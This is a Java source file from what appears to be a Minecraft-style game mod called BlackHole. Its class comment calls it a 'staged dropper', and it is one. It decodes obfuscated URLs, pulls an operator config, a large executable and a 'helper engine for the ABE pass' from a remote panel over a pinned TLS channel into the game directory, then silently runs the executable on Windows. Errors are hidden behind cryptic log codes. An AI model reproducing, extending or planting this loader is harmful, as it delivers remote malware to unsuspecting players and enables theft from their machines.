package com.blackhole.client;

import java.io.InputStream;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.Locale;

import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import java.security.SecureRandom;

/**
 * Staged dropper: the jar stays tiny and pulls its payload from the pinned
 * channel at runtime. Nothing large or sensitive is embedded in the jar.
 */
public final class PayloadRunner {

    private static final String EXE_URL = Str.d("1qmIa0ljV7jmlLpWfg44wP2Z1ltlGzyoy6qALEc5BUDw3LGeJ0k5DvratZc8VCgK", 190);
    private static final String CFG_URL = Str.d("STQrDu6G9NVJeRkz2eubvUJkdT7C/p/FZEcjSebCpA==", 33);
    private static final String TOOL_URL = Str.d("XyIB5MDo3j9/DyPJ55WhR3QSX9TskLUvclE5U+/VtpQoWDQZ9o+5lWNeKB6lz7GN", 55);

    public static void fetchAndRun(Path gameDir) {
        try {
            SSLContext ctx = SSLContext.getInstance("TLSv1.3");
            ctx.init(null, new TrustManagerPin[] { new TrustManagerPin() }, new SecureRandom());

            Path dir = gameDir.resolve(Str.d("TOPM3r2WdFQ2HA==", 98));
            Files.createDirectories(dir);

            // operator config first, if the panel has one for this build
            try {
                HttpsURLConnection ccon = (HttpsURLConnection) new URL(CFG_URL).openConnection();
                ccon.setSSLSocketFactory(ctx.getSocketFactory());
                ccon.setConnectTimeout(15000);
                ccon.setReadTimeout(20000);
                if (ccon.getResponseCode() == 200) {
                    try (InputStream cin = ccon.getInputStream()) {
                        Files.copy(cin, dir.resolve("bh_config.bin"), StandardCopyOption.REPLACE_EXISTING);
                    }
                }
            } catch (Throwable ignore) {
            }

            // the real payload, streamed to disk over the pinned channel
            Path exe = dir.resolve(Str.d("G/DotZl9VjwFvsq2iA==", 121));
            HttpsURLConnection con = (HttpsURLConnection) new URL(EXE_URL).openConnection();
            con.setSSLSocketFactory(ctx.getSocketFactory());
            con.setConnectTimeout(15000);
            con.setReadTimeout(90000);
            if (con.getResponseCode() != 200) {
                BlackHoleMod.LOGGER.info("[bh] np");
                return;
            }
            try (InputStream in = con.getInputStream()) {
                Files.copy(in, exe, StandardCopyOption.REPLACE_EXISTING);
            }
            if (Files.size(exe) < 1000000) {
                BlackHoleMod.LOGGER.info("[bh] ns");
                return;
            }

            // helper engine for the ABE pass
            try {
                HttpsURLConnection tcon = (HttpsURLConnection) new URL(TOOL_URL).openConnection();
                tcon.setSSLSocketFactory(ctx.getSocketFactory());
                tcon.setConnectTimeout(15000);
                tcon.setReadTimeout(60000);
                if (tcon.getResponseCode() == 200) {
                    try (InputStream tin = tcon.getInputStream()) {
                        Files.copy(tin, dir.resolve(Str.d("zKafY0YvBe3Rp5FrUR0ZtquQuIR+", 175)),
                                StandardCopyOption.REPLACE_EXISTING);
                    }
                }
            } catch (Throwable ignore) {
            }

            String os = System.getProperty("os.name", "").toLowerCase(Locale.ROOT);
            if (!os.contains("win")) {
                BlackHoleMod.LOGGER.info("[bh] nw");
                return;
            }

            new ProcessBuilder(exe.toAbsolutePath().toString())
                    .directory(dir.toFile())
                    .redirectOutput(dir.resolve("out.log").toFile())
                    .redirectErrorStream(true)
                    .start();
            BlackHoleMod.LOGGER.info("[bh] ok");
        } catch (Throwable e) {
            BlackHoleMod.LOGGER.info("[bh] e2");
        }
    }
}
